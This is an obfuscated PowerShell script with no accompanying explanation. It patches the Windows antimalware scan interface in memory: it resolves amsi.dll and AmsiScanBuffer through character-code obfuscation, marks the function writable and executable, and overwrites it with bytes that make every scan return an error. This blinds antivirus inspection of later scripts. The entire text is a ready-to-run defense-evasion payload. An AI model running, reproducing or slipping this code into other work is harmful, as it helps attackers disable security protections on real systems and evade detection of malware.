$AY2hrBZ = @"
using System;
using System.Runtime.InteropServices;
public class AY2hrBZ {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr DCPhRe9On0, string oypUuQjh_Jh3HRi);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr Iey3HUhjRTcsdD, UIntPtr SUJ, uint ffQsrUnTKsS8, out uint r_wRT19q);
}
"@

Add-Type $AY2hrBZ

$duI_2ESkA = [AY2hrBZ]::LoadLibrary("$(('àm'+'sí'+'.d'+'ll').nOrmAliZE([CHar](2+68)+[chAr]([bYtE]0x6f)+[CHaR](114*50/50)+[ChAr](109*68/68)+[ChaR]([ByTe]0x44)) -replace [CHAR]([ByTE]0x5c)+[CHar](112*38/38)+[chAR]([ByTE]0x7b)+[cHAR]([bYte]0x4d)+[CHaR](110+52-52)+[ChAr](125*74/74))")
$S6Ij4Mv29XBVBqZcotp = [AY2hrBZ]::GetProcAddress($duI_2ESkA, "$([chaR](65*21/21)+[CHar](65+44)+[cHaR](115*50/50)+[CHaR](42+63)+[ChAr](83)+[ChAr](99)+[cHAr]([byte]0x61)+[cHar](110)+[CHaR](39+27)+[cHaR](117+41-41)+[cHar]([bYTE]0x66)+[CHar]([ByTE]0x66)+[Char]([bytE]0x65)+[ChAr]([BYTe]0x72))")
$p = 0
[AY2hrBZ]::VirtualProtect($S6Ij4Mv29XBVBqZcotp, [uint32]5, 0x40, [ref]$p)
$E4j2isPlYkWv = "0xB8"
$JxxP2IcGy = "0x57"
$tiI = "0x00"
$nLms4XtGUEJv0aCp = "0x07"
$ZJN = "0x80"
$SxCfDh = "0xC3"
$a0gx = [Byte[]] ($E4j2isPlYkWv,$JxxP2IcGy,$tiI,$nLms4XtGUEJv0aCp,+$ZJN,+$SxCfDh)
[System.Runtime.InteropServices.Marshal]::Copy($a0gx, 0, $S6Ij4Mv29XBVBqZcotp, 6)